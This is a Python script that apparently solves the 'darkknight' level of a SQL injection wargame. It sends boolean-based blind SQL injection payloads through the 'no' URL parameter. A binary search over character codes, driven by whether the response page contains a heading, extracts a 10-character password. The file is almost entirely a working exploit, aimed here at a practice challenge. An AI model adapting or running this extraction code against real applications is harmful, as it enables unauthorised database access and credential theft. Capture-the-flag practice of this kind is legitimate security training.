import sys
import time

import requests
from bs4 import BeautifulSoup

URL = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
PHPSESSID = sys.argv[1]

sess = requests.Session()
sess.cookies.set("PHPSESSID", PHPSESSID)


def next_char(current_password: str) -> str:
    print(f"[+] Trying: ", end="")
    lo = 0
    hi = 127
    mid = 0
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        print(chr(mid), end="", flush=True)
        query = f'0 or pw < "{current_password + chr(mid)}" && id < "guest"'
        res = sess.get(URL, params={"no": query})
        time.sleep(0.1)
        soup = BeautifulSoup(res.text, features="html.parser")
        if soup.h2 is not None:
            hi = mid
        else:
            lo = mid
    print()
    return chr(lo)


password = ""
for i in range(10):
    password += next_char(password)
    print(f"[+] Current password: {password}")
